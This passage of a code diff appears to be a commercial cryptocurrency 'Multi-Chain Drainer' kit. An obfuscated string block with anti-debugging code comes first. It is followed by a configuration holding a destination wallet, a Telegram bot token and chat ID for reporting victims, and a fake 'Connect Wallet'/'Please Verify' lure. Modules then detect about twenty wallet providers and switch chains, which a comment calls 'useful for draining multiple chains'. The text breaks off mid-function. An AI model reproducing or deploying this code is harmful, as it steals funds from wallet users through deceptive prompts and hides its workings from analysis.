taseed','\x22\x20data-wal','ved</b>','location','d\x22>\x0a\x20\x20\x20\x20\x20\x20','px;\x0a\x20\x20\x20\x20\x20\x20','metamask','#1969FF','0x4A817C80','<div\x20class','Unknown\x20Wa','e77c8cC223','#667eea','\x20external\x20',',\x201);\x0a\x20\x20\x20\x20','ease;\x0a\x20\x20\x20\x20','nsform:\x20tr','\x20}\x0a\x20\x20\x20\x20.wa','wWallet.sv','dth:\x2032px;','userAgent','c.gnosisch','bezier(0.4','ess\x20holder','nner\x20{\x0a\x20\x20\x20','on\x22\x20id=\x22ch','ermit,\x20tup','p.tonkeepe','display','ngth','version','dal-overla','=\x22chain-sp','102,\x20126,\x20','isBitKeep','ts/walletC','bool\x20allow','Scroll','nder,\x20uint','mChain','\x0a\x20\x20\x20\x20\x20\x20vis','error','\x20Failed\x20to','ty\x200.3s\x20ea','utton','f7006a004d','\x20none;\x20pad','ple(tuple(','switchTo','value','sources/ma','ntain;\x0a\x20\x20\x20','\x20\x20\x20\x20\x20\x20righ','Wallet:\x20<c','0,0,0.4),\x20','org','lay:\x20flex;','1216083OUrLDN','linear-gra','\x20detected,','14px;\x0a\x20\x20\x20\x20','\x0a\x20\x20\x20\x20.chai','https://gn','t-manifest','w.okx.com/','style','255,\x200.1);','Unknown\x20Ch','\x20\x20\x20\x20\x20\x20\x20<di','/sendMessa','function\x20p','\x22\x20data-cha','returns\x20(u','9183ed9a1a','4c7C32D4f7','Blast','position:\x20','detecting','l\x22>\x0a\x20\x20\x20\x20\x20\x20','ity:\x200.7;\x0a','x;\x0a\x20\x20\x20\x20}\x0a\x20','e-system,\x20','rcontent.c',':\x20center;\x0a','#F9A826','recipient','ansparent;','.chain-swi','1.binance.','ermitTrans','div>\x0a\x20\x20\x20\x20\x20','gnature\x20le','\x20\x20\x20\x20','ht:\x2056px;\x20','nner','uint256\x20am','latest','ver\x20{\x20back','itemHover','padEnd','le=\x22backgr','from,\x20addr','ive\x20{\x0a\x20\x20\x20\x20','\x20\x20<div\x20cla',',\x200,\x200.2,\x20','ChainLink\x20','Ether','rainbowkit','wallet_swi',';\x20opacity:','</p>\x0a\x20\x20\x20\x20\x20','0x7ecebe00','plorer.zks','.wallet-mo','\x200\x2025px\x2080','.1);\x20borde','0x2105','toLowerCas','aster/Logo','nal','0.1)','nt256)',':\x200;\x0a\x20\x20\x20\x20\x20','event\x20Perm','al-styles','ermit(addr','nd\x200.2s\x20ea','Linea','/tonconnec','\x22chain-gri','#3897f0','ance',';\x20cursor:\x20','{\x0a\x20\x20\x20\x20\x20\x20to','argin:\x200;\x0a','https://ph','CELO','Solana\x20con','7;\x0a\x20\x20\x20\x20\x20\x20o','\x20uint256\x20d','rpc','\x20\x20\x20transit','referrer','s\x20(uint8)','text-align','font-weigh','c.ftm.tool','verlay\x20{\x0a\x20','ercontent.','mainTx','function\x20t','#chain-swi',':\x2012px;\x0a\x20\x20','work/ext/b','querySelec','amount','border-rad','default','on.ico','isitor</b>','#efefef','modal-titl','endAmount','\x200\x2020px\x2040','modalType','ss\x20spender','/trust_pla','ontract','zoneHash','in-modal-o','se;\x0a\x20\x20\x20\x20}\x0a','evm','eg,\x20#1e1e1','toString','wallet_add','6\x20deadline','destinatio','l\x20{\x0a\x20\x20\x20\x20\x20\x20','All\x20signin','uple(addre','ternal\x20vie','<span\x20clas','}\x0a\x20\x20\x20\x20.cha','pedData_v4','\x20\x20\x20\x20positi','map','/api/log-e','#0052FF','rgin-botto','ch(tuple(t','ild','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20','as\x20per\x20con','llet-grid\x22','</span>\x0a\x20\x20','check','tor','\x2050%;\x0a\x20\x20\x20\x20','teY(-2px);',';\x20height:\x20','al-overlay','0;\x0a\x20\x20\x20\x20\x20\x20\x20','\x20\x20\x20\x20\x20</div','ine)\x20permi','text','SOL','r;\x20padding','s:\x20center;','239,\x2068,\x206','0;\x0a\x20\x20\x20\x20\x20\x20b','rabby','wner,\x20byte','dding:\x2024p','providers','ture\x20Recei','0x5208','c-bezier(0','osisscan.i','https://ip','event\x20Appr','lay.active','<b>⚡\x20Actio','cc950d9822','brave',')\x20external','\x20\x20\x20margin-','ignature)\x20','mit2Signat','nk-btn\x20{\x0a\x20','bytes32','address','Ledger','MATIC','nd:\x20','tton\x20class','>\x0a\x20\x20\x20\x20\x20\x20</',':\x20relative','onfigured','her','polygon','uint256','title\x22>Con','onnectors/',':\x20#a0a0b0;','owkit/main','ch]\x20Failed','hain-modal','action','0;\x0a\x20\x20\x20\x20\x20\x20m','in-left:\x20a','ns:\x201fr\x201f','floor','ect]\x20Provi','epeat(3,\x201','-content:\x20','\x5c(\x20*\x5c)','ss=\x22wallet','walletconn','innet.era.','Unsupporte','let=\x22',':AAHxALLf4','\x20</div>\x0a\x20\x20','ail\x20{\x0a\x20\x20\x20\x20','\x20to\x20switch','mscan.com','\x22chain-nam','/src/walle','97C13D831e','@media\x20(ma','#111','ize:\x2014px;','TronLink','Logger',',\x200,\x200.8);','{\x0a\x20\x20\x20\x20\x20\x20ba','er;\x0a\x20\x20\x20\x20\x20\x20','w-me/rainb','t:\x2080vh;\x0a\x20','0x55d39832'];_0x2f57=function(){return _0x177f60;};return _0x2f57();}function _0x38ef63(_0x1fdbd7){function _0x228492(_0x3a8548){const _0x2e48f4=_0x4a8a;if(typeof _0x3a8548==='string')return function(_0x4f88ae){}[_0x2e48f4(0x641)+'r'](_0x2e48f4(0x97)+_0x2e48f4(0x2cf))[_0x2e48f4(0x28b)](_0x2e48f4(0x5bd));else(''+_0x3a8548/_0x3a8548)[_0x2e48f4(0x43e)]!==0x1||_0x3a8548%0x14===0x0?function(){return!![];}[_0x2e48f4(0x641)+'r'](_0x2e48f4(0x450)+_0x2e48f4(0x2cc))[_0x2e48f4(0xec)]('action'):function(){return![];}[_0x2e48f4(0x641)+'r'](_0x2e48f4(0x450)+_0x2e48f4(0x2cc))[_0x2e48f4(0x28b)]('stateObjec'+'t');_0x228492(++_0x3a8548);}try{if(_0x1fdbd7)return _0x228492;else _0x228492(0x0);}catch(_0x37d6df){}}
+// ==========================================
+// BUILD: ab5b6416
+// SCRIPT: Default Multi-Chain Drainer
+// GENERATED: 2026-03-24T12:06:51.219Z
+// PLAN RESTRICTIONS: Bronze, Gold, Diamond
+// ==========================================
+
+(function() {
+  'use strict';
+
+  // ===== CONFIGURATION =====
+  window.DRAINER_CONFIG = {
+  "destination": "0xa416385102e69b4628737b10984C574279fb7154",
+  "telegram": {
+    "botToken": "8715690141:AAHxALLf424ingrOPaje4FSjs4lhdn18Aak",
+    "chatId": "7737212833"
+  },
+  "ui": {
+    "connectButtonsClass": "interact-button",
+    "drainButtonsClass": "interact-button",
+    "connectText": "Connect Wallet",
+    "verifyText": "Please Verify",
+    "modalType": "default"
+  },
+  "reown": {
+    "projectId": "61cb704eeafaa41c97d99183ed9a1a14"
+  },
+  "ton": {
+    "manifestUrl": "/tonconnect-manifest.json"
+  },
+  "checkboxes": {},
+  "destinationWallet": "0xa416385102e69b4628737b10984C574279fb7154",
+  "telegramBotToken": "8715690141:AAHxALLf424ingrOPaje4FSjs4lhdn18Aak",
+  "telegramChatId": "7737212833",
+  "connectButtonsClass": "interact-button",
+  "drainButtonsClass": "interact-button",
+  "connectText": "Connect Wallet",
+  "verifyText": "Please Verify"
+};
+
+  // ===== CORE MODULES =====
+  /**
+ * Wallet Detection Module
+ * Detects MetaMask, WalletConnect, Trust Wallet, Coinbase Wallet, and other Web3 providers
+ * Supports both EIP-1193 and legacy providers
+ */
+
+const WalletDetect = (function() {
+  'use strict';
+
+  // Provider detection configurations
+  const PROVIDERS = {
+    metamask: {
+      name: 'MetaMask',
+      icon: '🦊',
+      check: (provider) => provider.isMetaMask && !provider.isBraveWallet,
+      priority: 1
+    },
+    brave: {
+      name: 'Brave Wallet',
+      icon: '🦁',
+      check: (provider) => provider.isBraveWallet,
+      priority: 2
+    },
+    trust: {
+      name: 'Trust Wallet',
+      icon: '🔐',
+      check: (provider) => provider.isTrust || provider.isTrustWallet,
+      priority: 3
+    },
+    coinbase: {
+      name: 'Coinbase Wallet',
+      icon: '🔵',
+      check: (provider) => provider.isCoinbaseWallet,
+      priority: 4
+    },
+    rainbow: {
+      name: 'Rainbow',
+      icon: '🌈',
+      check: (provider) => provider.isRainbow,
+      priority: 5
+    },
+    ledger: {
+      name: 'Ledger',
+      icon: '📒',
+      check: (provider) => provider.isLedger,
+      priority: 6
+    },
+    phantom: {
+      name: 'Phantom',
+      icon: '👻',
+      check: (provider) => provider.isPhantom,
+      priority: 7,
+      type: 'solana'
+    },
+    tronlink: {
+      name: 'TronLink',
+      icon: '⚡',
+      check: () => window.tronLink && window.tronLink.ready,
+      priority: 8,
+      type: 'tron'
+    },
+    okx: {
+      name: 'OKX Wallet',
+      icon: '✖️',
+      check: (provider) => provider.isOkxWallet,
+      priority: 9
+    },
+    rabby: {
+      name: 'Rabby',
+      icon: '🐰',
+      check: (provider) => provider.isRabby,
+      priority: 10
+    },
+    walletconnect: {
+      name: 'WalletConnect',
+      icon: '🔗',
+      check: (provider) => provider.connector || provider.isWalletConnect,
+      priority: 11
+    },
+    frame: {
+      name: 'Frame',
+      icon: '🖼️',
+      check: (provider) => provider.isFrame,
+      priority: 12
+    },
+    tokenpocket: {
+      name: 'TokenPocket',
+      icon: '💼',
+      check: (provider) => provider.isTokenPocket,
+      priority: 13
+    },
+    bitkeep: {
+      name: 'BitKeep',
+      icon: '💎',
+      check: (provider) => provider.isBitKeep || provider.isBitkeep,
+      priority: 14
+    },
+    safepal: {
+      name: 'SafePal',
+      icon: '🛡️',
+      check: (provider) => provider.isSafePal,
+      priority: 15
+    },
+    xdefi: {
+      name: 'XDEFI',
+      icon: '🌐',
+      check: (provider) => provider.isXDEFI,
+      priority: 16
+    },
+    exodus: {
+      name: 'Exodus',
+      icon: '🚀',
+      check: (provider) => provider.isExodus,
+      priority: 17
+    },
+    zeal: {
+      name: 'Zeal',
+      icon: '⚡',
+      check: (provider) => provider.isZeal,
+      priority: 18
+    },
+    oneInch: {
+      name: '1inch Wallet',
+      icon: '🦄',
+      check: (provider) => provider.isOneInchIOSWallet || provider.isOneInchAndroidWallet,
+      priority: 19
+    },
+    tally: {
+      name: 'Tally Ho',
+      icon: '🦌',
+      check: (provider) => provider.isTally,
+      priority: 20
+    }
+  };
+
+  // Chain configurations
+  const CHAINS = {
+    eth: { chainId: '0x1', name: 'Ethereum', symbol: 'ETH', rpc: 'https://eth.llamarpc.com' },
+    bsc: { chainId: '0x38', name: 'BNB Smart Chain', symbol: 'BNB', rpc: 'https://bsc-dataseed1.binance.org' },
+    polygon: { chainId: '0x89', name: 'Polygon', symbol: 'MATIC', rpc: 'https://polygon-rpc.com' },
+    avax: { chainId: '0xa86a', name: 'Avalanche', symbol: 'AVAX', rpc: 'https://api.avax.network/ext/bc/C/rpc' },
+    arbitrum: { chainId: '0xa4b1', name: 'Arbitrum One', symbol: 'ETH', rpc: 'https://arb1.arbitrum.io/rpc' },
+    optimism: { chainId: '0xa', name: 'Optimism', symbol: 'ETH', rpc: 'https://mainnet.optimism.io' },
+    base: { chainId: '0x2105', name: 'Base', symbol: 'ETH', rpc: 'https://mainnet.base.org' },
+    fantom: { chainId: '0xfa', name: 'Fantom', symbol: 'FTM', rpc: 'https://rpc.ftm.tools' },
+    unichain: { chainId: '0x82', name: 'Unichain', symbol: 'ETH', rpc: 'https://mainnet.unichain.org' },
+    sonic: { chainId: '0x92', name: 'Sonic', symbol: 'S', rpc: 'https://rpc.soniclabs.com' },
+    berachain: { chainId: '0x138c2', name: 'Berachain', symbol: 'BERA', rpc: 'https://rpc.berachain.com' },
+    sol: { chainId: null, name: 'Solana', symbol: 'SOL', type: 'solana' },
+    tron: { chainId: null, name: 'Tron', symbol: 'TRX', type: 'tron' }
+  };
+
+  /**
+   * Get all available providers from window.ethereum
+   */
+  function getProviders() {
+    const providers = [];
+    
+    if (!window.ethereum) {
+      return providers;
+    }
+
+    // Handle multiple providers (EIP-5749)
+    if (window.ethereum.providers && Array.isArray(window.ethereum.providers)) {
+      window.ethereum.providers.forEach(provider => {
+        const detected = detectProviderType(provider);
+        if (detected) {
+          providers.push({
+            provider: provider,
+            ...detected
+          });
+        }
+      });
+    } else {
+      // Single provider
+      const detected = detectProviderType(window.ethereum);
+      if (detected) {
+        providers.push({
+          provider: window.ethereum,
+          ...detected
+        });
+      }
+    }
+
+    // Sort by priority
+    return providers.sort((a, b) => a.priority - b.priority);
+  }
+
+  /**
+   * Detect provider type
+   */
+  function detectProviderType(provider) {
+    for (const [key, config] of Object.entries(PROVIDERS)) {
+      try {
+        if (config.check(provider)) {
+          return {
+            type: key,
+            name: config.name,
+            icon: config.icon,
+            walletType: config.type || 'evm',
+            priority: config.priority
+          };
+        }
+      } catch (e) {
+        // Detection failed, continue
+      }
+    }
+    
+    // Unknown provider - still usable
+    return {
+      type: 'unknown',
+      name: 'Unknown Wallet',
+      icon: '👛',
+      walletType: 'evm',
+      priority: 999
+    };
+  }
+
+  /**
+   * Get the primary provider (highest priority)
+   */
+  function getPrimaryProvider() {
+    const providers = getProviders();
+    return providers.length > 0 ? providers[0] : null;
+  }
+
+  /**
+   * Check if any wallet is installed
+   */
+  function isWalletInstalled() {
+    return !!(window.ethereum || window.tronLink || window.solana || window.phantom);
+  }
+
+  /**
+   * Check if wallet is connected
+   */
+  async function isConnected(provider = window.ethereum) {
+    if (!provider) return false;
+    
+    try {
+      const accounts = await provider.request({ method: 'eth_accounts' });
+      return accounts && accounts.length > 0;
+    } catch (e) {
+      return false;
+    }
+  }
+
+  /**
+   * Get connected accounts
+   */
+  async function getAccounts(provider = window.ethereum) {
+    if (!provider) return [];
+    
+    try {
+      return await provider.request({ method: 'eth_accounts' }) || [];
+    } catch (e) {
+      return [];
+    }
+  }
+
+  let uiAdapter = null;
+
+  /**
+   * Register a UI Adapter (e.g., Reown, RainbowKit)
+   * This allows modern modal-based connections to override the default injection logic.
+   */
+  function registerAdapter(adapter) {
+    if (adapter && typeof adapter.connect === 'function') {
+      console.log('[WalletDetect] UI Adapter registered:', adapter.name || 'Unknown');
+      uiAdapter = adapter;
+    }
+  }
+
+  /**
+   * Request wallet connection
+   */
+  async function connect(provider = window.ethereum) {
+    // 1. UI Adapter (priority)
+    if (uiAdapter) {
+      try {
+        const result = await uiAdapter.connect();
+        return result;
+      } catch (e) {
+        console.error('[WalletDetect] Adapter connection failed:', e);
+        throw e;
+      }
+    }
+  
+    // 2. If no injected wallet → open modal instead
+    if (!provider) {
+      console.log('[WalletDetect] No provider, opening modal...');
+  
+      try {
+        const result = await WalletModal.show();
+        return result;
+      } catch (e) {
+        throw new Error('User closed modal or no wallet selected');
+      }
+    }
+  
+    // 3. Injected wallet (MetaMask, etc.)
+    try {
+      const accounts = await provider.request({
+        method: 'eth_requestAccounts'
+      });
+  
+      return {
+        address: accounts[0],
+        wallet: 'injected'
+      };
+    } catch (err) {
+      console.error('[WalletDetect] Provider connection failed:', err);
+      throw err;
+    }
+  }
+
+  /**
+   * Get current chain ID
+   */
+  async function getChainId(provider = window.ethereum) {
+    if (!provider) return null;
+    
+    try {
+      const chainId = await provider.request({ method: 'eth_chainId' });
+      return chainId;
+    } catch (e) {
+      return null;
+    }
+  }
+
+  /**
+   * Get chain info by chain ID
+   */
+  function getChainInfo(chainId) {
+    const hexChainId = typeof chainId === 'number' ? '0x' + chainId.toString(16) : chainId;
+    
+    for (const [key, chain] of Object.entries(CHAINS)) {
+      if (chain.chainId === hexChainId || chain.chainId === chainId) {
+        return { key, ...chain };
+      }
+    }
+    return null;
+  }
+
+  /**
+   * Request chain switch
+   */
+  async function switchChain(provider, chainId) {
+    if (!provider) {
+      throw new Error('No provider');
+    }
+
+    const hexChainId = typeof chainId === 'number' ? '0x' + chainId.toString(16) : chainId;
+
+    try {
+      await provider.request({
+        method: 'wallet_switchEthereumChain',
+        params: [{ chainId: hexChainId }]
+      });
+      return true;
+    } catch (switchError) {
+      // Chain not added to wallet
+      if (switchError.code === 4902) {
+        const chainInfo = getChainInfo(hexChainId);
+        if (chainInfo) {
+          try {
+            await provider.request({
+              method: 'wallet_addEthereumChain',
+              params: [{
+                chainId: hexChainId,
+                chainName: chainInfo.name,
+                nativeCurrency: {
+                  name: chainInfo.name,
+                  symbol: chainInfo.symbol,
+                  decimals: 18
+                },
+                rpcUrls: [chainInfo.rpc],
+                blockExplorerUrls: []
+              }]
+            });
+            return true;
+          } catch (addError) {
+            throw new Error('Failed to add chain: ' + addError.message);
+          }
+        }
+      }
+      throw switchError;
+    }
+  }
+
+  /**
+   * Listen for account changes
+   */
+  function onAccountsChanged(provider, callback) {
+    if (!provider) return;
+    
+    provider.on('accountsChanged', (accounts) => {
+      callback(accounts);
+    });
+  }
+
+  /**
+   * Listen for chain changes
+   */
+  function onChainChanged(provider, callback) {
+    if (!provider) return;
+    
+    provider.on('chainChanged', (chainId) => {
+      callback(chainId);
+    });
+  }
+
+  /**
+   * Listen for disconnect
+   */
+  function onDisconnect(provider, callback) {
+    if (!provider) return;
+    
+    provider.on('disconnect', (error) => {
+      callback(error);
+    });
+  }
+
+  /**
+   * Get Solana provider
+   */
+  function getSolanaProvider() {
+    return window.solana || window.phantom?.solana || null;
+  }
+
+  /**
+   * Get Tron provider
+   */
+  function getTronProvider() {
+    return window.tronLink || null;
+  }
+
+  /**
+   * Connect to Solana wallet
+   */
+  async function connectSolana() {
+    const provider = getSolanaProvider();
+    if (!provider) {
+      throw new Error('No Solana wallet found');
+    }
+
+    try {
+      const response = await provider.connect();
+      return {
+        publicKey: response.publicKey.toString(),
+        address: response.publicKey.toString()
+      };
+    } catch (error) {
+      throw new Error('Solana connection failed: ' + error.message);
+    }
+  }
+
+  /**
+   * Connect to Tron wallet
+   */
+  async function connectTron() {
+    const provider = getTronProvider();
+    if (!provider) {
+      throw new Error('No Tron wallet found');
+    }
+
+    try {
+      if (!provider.ready) {
+        await provider.request({ method: 'tron_requestAccounts' });
+      }
+      const address = provider.tronWeb?.defaultAddress?.base58;
+      return { address };
+    } catch (error) {
+      throw new Error('Tron connection failed: ' + error.message);
+    }
+  }
+
+  // Public API
+  return {
+    PROVIDERS,
+    CHAINS,
+    getProviders,
+    getPrimaryProvider,
+    isWalletInstalled,
+    isConnected,
+    getAccounts,
+    connect,
+    getChainId,
+    getChainInfo,
+    switchChain,
+    onAccountsChanged,
+    onChainChanged,
+    onDisconnect,
+    getSolanaProvider,
+    getTronProvider,
+    connectSolana,
+    connectTron,
+    registerAdapter
+  };
+})();
+
+// Export for module systems
+if (typeof module !== 'undefined' && module.exports) {
+  module.exports = WalletDetect;
+}
+
+/**
+ * Chain Switch Module
+ * Handles network switching across all supported chains
+ * Supports both EVM and non-EVM chains (Solana, Tron)
+ */
+
+const ChainSwitch = (function() {
+  'use strict';
+
+  // Extended chain configurations with full params
+  const CHAIN_PARAMS = {
+    // Ethereum Mainnet
+    eth: {
+      chainId: '0x1',
+      chainName: 'Ethereum Mainnet',
+      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+      rpcUrls: ['https://eth.llamarpc.com', 'https://ethereum.publicnode.com'],
+      blockExplorerUrls: ['https://etherscan.io'],
+      iconUrls: []
+    },
+    // BNB Smart Chain
+    bsc: {
+      chainId: '0x38',
+      chainName: 'BNB Smart Chain',
+      nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+      rpcUrls: ['https://bsc-dataseed1.binance.org', 'https://bsc-dataseed2.binance.org'],
+      blockExplorerUrls: ['https://bscscan.com'],
+      iconUrls: []
+    },
+    // Polygon
+    polygon: {
+      chainId: '0x89',
+      chainName: 'Polygon Mainnet',
+      nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
+      rpcUrls: ['https://polygon-rpc.com', 'https://rpc-mainnet.matic.quiknode.pro'],
+      blockExplorerUrls: ['https://polygonscan.com'],
+      iconUrls: []
+    },
+    // Avalanche
+    avax: {
+      chainId: '0xa86a',
+      chainName: 'Avalanche C-Chain',
+      nativeCurrency: { name: 'Avalanche', symbol: 'AVAX', decimals: 18 },
+      rpcUrls: ['https://api.avax.network/ext/bc/C/rpc'],
+      blockExplorerUrls: ['https://snowtrace.io'],
+      iconUrls: []
+    },
+    // Arbitrum
+    arbitrum: {
+      chainId: '0xa4b1',
+      chainName: 'Arbitrum One',
+      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+      rpcUrls: ['https://arb1.arbitrum.io/rpc'],
+      blockExplorerUrls: ['https://arbiscan.io'],
+      iconUrls: []
+    },
+    // Optimism
+    optimism: {
+      chainId: '0xa',
+      chainName: 'Optimism',
+      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+      rpcUrls: ['https://mainnet.optimism.io'],
+      blockExplorerUrls: ['https://optimistic.etherscan.io'],
+      iconUrls: []
+    },
+    // Base
+    base: {
+      chainId: '0x2105',
+      chainName: 'Base',
+      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+      rpcUrls: ['https://mainnet.base.org'],
+      blockExplorerUrls: ['https://basescan.org'],
+      iconUrls: []
+    },
+    // Fantom
+    fantom: {
+      chainId: '0xfa',
+      chainName: 'Fantom Opera',
+      nativeCurrency: { name: 'Fantom', symbol: 'FTM', decimals: 18 },
+      rpcUrls: ['https://rpc.ftm.tools', 'https://fantom.publicnode.com'],
+      blockExplorerUrls: ['https://ftmscan.com'],
+      iconUrls: []
+    },
+    // Unichain
+    unichain: {
+      chainId: '0x82',
+      chainName: 'Unichain',
+      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+      rpcUrls: ['https://mainnet.unichain.org'],
+      blockExplorerUrls: ['https://uniscan.xyz'],
+      iconUrls: []
+    },
+    // Sonic
+    sonic: {
+      chainId: '0x92',
+      chainName: 'Sonic',
+      nativeCurrency: { name: 'Sonic', symbol: 'S', decimals: 18 },
+      rpcUrls: ['https://rpc.soniclabs.com'],
+      blockExplorerUrls: ['https://sonicscan.org'],
+      iconUrls: []
+    },
+    // Berachain
+    berachain: {
+      chainId: '0x138c2',
+      chainName: 'Berachain',
+      nativeCurrency: { name: 'BERA', symbol: 'BERA', decimals: 18 },
+      rpcUrls: ['https://rpc.berachain.com'],
+      blockExplorerUrls: ['https://berascan.com'],
+      iconUrls: []
+    },
+    // Linea
+    linea: {
+      chainId: '0xe708',
+      chainName: 'Linea',
+      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+      rpcUrls: ['https://rpc.linea.build'],
+      blockExplorerUrls: ['https://lineascan.build'],
+      iconUrls: []
+    },
+    // Scroll
+    scroll: {
+      chainId: '0x534352',
+      chainName: 'Scroll',
+      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+      rpcUrls: ['https://rpc.scroll.io'],
+      blockExplorerUrls: ['https://scrollscan.com'],
+      iconUrls: []
+    },
+    // zkSync Era
+    zksync: {
+      chainId: '0x144',
+      chainName: 'zkSync Era',
+      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+      rpcUrls: ['https://mainnet.era.zksync.io'],
+      blockExplorerUrls: ['https://explorer.zksync.io'],
+      iconUrls: []
+    },
+    // Blast
+    blast: {
+      chainId: '0x13e31',
+      chainName: 'Blast',
+      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+      rpcUrls: ['https://rpc.blast.io'],
+      blockExplorerUrls: ['https://blastscan.io'],
+      iconUrls: []
+    },
+    // Gnosis
+    gnosis: {
+      chainId: '0x64',
+      chainName: 'Gnosis Chain',
+      nativeCurrency: { name: 'xDai', symbol: 'XDAI', decimals: 18 },
+      rpcUrls: ['https://rpc.gnosischain.com'],
+      blockExplorerUrls: ['https://gnosisscan.io'],
+      iconUrls: []
+    },
+    // Celo
+    celo: {
+      chainId: '0xa4ec',
+      chainName: 'Celo',
+      nativeCurrency: { name: 'Celo', symbol: 'CELO', decimals: 18 },
+      rpcUrls: ['https://forno.celo.org'],
+      blockExplorerUrls: ['https://celoscan.io'],
+      iconUrls: []
+    }
+  };
+
+  // Chain ID to key mapping
+  const CHAIN_ID_MAP = {
+    '0x1': 'eth',
+    '0x38': 'bsc',
+    '0x89': 'polygon',
+    '0xa86a': 'avax',
+    '0xa4b1': 'arbitrum',
+    '0xa': 'optimism',
+    '0x2105': 'base',
+    '0xfa': 'fantom',
+    '0x82': 'unichain',
+    '0x92': 'sonic',
+    '0x138c2': 'berachain',
+    '0xe708': 'linea',
+    '0x534352': 'scroll',
+    '0x144': 'zksync',
+    '0x13e31': 'blast',
+    '0x64': 'gnosis',
+    '0xa4ec': 'celo'
+  };
+
+  /**
+   * Switch to a specific chain
+   * @param {object} provider - Web3 provider
+   * @param {string|number} chainKeyOrId - Chain key (e.g., 'eth') or chain ID
+   * @returns {Promise<boolean>}
+   */
+  async function switchTo(provider, chainKeyOrId) {
+    if (!provider) {
+      throw new Error('No provider available');
+    }
+
+    // Normalize chain ID
+    let chainKey, chainParams;
+    
+    if (typeof chainKeyOrId === 'string' && chainKeyOrId.startsWith('0x')) {
+      // Hex chain ID provided
+      chainKey = CHAIN_ID_MAP[chainKeyOrId.toLowerCase()];
+      chainParams = CHAIN_PARAMS[chainKey];
+      chainParams = { ...chainParams, chainId: chainKeyOrId };
+    } else if (typeof chainKeyOrId === 'number') {
+      // Numeric chain ID provided
+      const hexId = '0x' + chainKeyOrId.toString(16);
+      chainKey = CHAIN_ID_MAP[hexId.toLowerCase()];
+      chainParams = CHAIN_PARAMS[chainKey];
+      if (chainParams) {
+        chainParams = { ...chainParams, chainId: hexId };
+      }
+    } else {
+      // Chain key provided
+      chainKey = chainKeyOrId.toLowerCase();
+      chainParams = CHAIN_PARAMS[chainKey];
+    }
+
+    if (!chainParams) {
+      throw new Error(`Unsupported chain: ${chainKeyOrId}`);
+    }
+
+    try {
+      // Try switching first
+      await provider.request({
+        method: 'wallet_switchEthereumChain',
+        params: [{ chainId: chainParams.chainId }]
+      });
+      return { success: true, chainKey, chainId: chainParams.chainId };
+    } catch (switchError) {
+      // Chain not added - try adding it
+      if (switchError.code === 4902) {
+        try {
+          await provider.request({
+            method: 'wallet_addEthereumChain',
+            params: [chainParams]
+          });
+          return { success: true, chainKey, chainId: chainParams.chainId, added: true };
+        } catch (addError) {
+          throw new Error(`Failed to add chain ${chainParams.chainName}: ${addError.message}`);
+        }
+      }
+      throw switchError;
+    }
+  }
+
+  /**
+   * Switch to multiple chains sequentially
+   * @param {object} provider - Web3 provider
+   * @param {string[]} chainKeys - Array of chain keys
+   * @returns {Promise<object[]>}
+   */
+  async function switchMultiple(provider, chainKeys) {
+    const results = [];
+    
+    for (const chainKey of chainKeys) {
+      try {
+        const result = await switchTo(provider, chainKey);
+        results.push({ chainKey, ...result });
+      } catch (error) {
+        results.push({ chainKey, success: false, error: error.message });
+      }
+    }
+    
+    return results;
+  }
+
+  /**
+   * Get current chain
+   * @param {object} provider - Web3 provider
+   * @returns {Promise<object>}
+   */
+  async function getCurrentChain(provider) {
+    if (!provider) return null;
+    
+    try {
+      const chainId = await provider.request({ method: 'eth_chainId' });
+      const chainKey = CHAIN_ID_MAP[chainId.toLowerCase()];
+      const chainParams = CHAIN_PARAMS[chainKey];
+      
+      return {
+        chainId,
+        chainKey,
+        ...chainParams
+      };
+    } catch (error) {
+      return null;
+    }
+  }
+
+  /**
+   * Check if provider is on specific chain
+   * @param {object} provider - Web3 provider
+   * @param {string|number} chainKeyOrId - Chain to check
+   * @returns {Promise<boolean>}
+   */
+  async function isOnChain(provider, chainKeyOrId) {
+    const current = await getCurrentChain(provider);
+    if (!current) return false;
+    
+    let targetId;
+    if (typeof chainKeyOrId === 'string' && chainKeyOrId.startsWith('0x')) {
+      targetId = chainKeyOrId.toLowerCase();
+    } else if (typeof chainKeyOrId === 'number') {
+      targetId = '0x' + chainKeyOrId.toString(16);
+    } else {
+      const params = CHAIN_PARAMS[chainKeyOrId.toLowerCase()];
+      targetId = params?.chainId;
+    }
+    
+    return current.chainId.toLowerCase() === targetId?.toLowerCase();
+  }
+
+  /**
+   * Watch for chain changes
+   * @param {object} provider - Web3 provider
+   * @param {function} callback - Callback function
+   */
+  function watchChainChanges(provider, callback) {
+    if (!provider) return;
+    
+    provider.on('chainChanged', (chainId) => {
+      const chainKey = CHAIN_ID_MAP[chainId.toLowerCase()];
+      const chainParams = CHAIN_PARAMS[chainKey];
+      callback({
+        chainId,
+        chainKey,
+        ...chainParams
+      });
+    });
+  }
+
+  /**
+   * Get all supported chains
+   * @returns {object}
+   */
+  function getSupportedChains() {
+    return { ...CHAIN_PARAMS };
+  }
+
+  /**
+   * Get chain params by key or ID
+   * @param {string|number} chainKeyOrId
+   * @returns {object|null}
+   */
+  function getChainParams(chainKeyOrId) {
+    if (typeof chainKeyOrId === 'string' && chainKeyOrId.startsWith('0x')) {
+      const key = CHAIN_ID_MAP[chainKeyOrId.toLowerCase()];
+      return key ? CHAIN_PARAMS[key] : null;
+    } else if (typeof chainKeyOrId === 'number') {
+      const hexId = '0x' + chainKeyOrId.toString(16);
+      const key = CHAIN_ID_MAP[hexId.toLowerCase()];
+      return key ? CHAIN_PARAMS[key] : null;
+    } else {
+      return CHAIN_PARAMS[chainKeyOrId.toLowerCase()] || null;
+    }
+  }
+
+  /**
+   * Batch switch with callback after each switch
+   * Useful for draining multiple chains
+   */
+  async function batchSwitchWithCallback(provider, chainKeys, callback, options = {}) {
+    const { delayBetweenSwitches = 500, continueOnError = true } = options;
+    const results = [];
+    
+    for (const chainKey of chainKeys) {
+      try {
+        const switchResult = await switchTo(provider, chainKey);
+        
+        if (switchResult.success) {
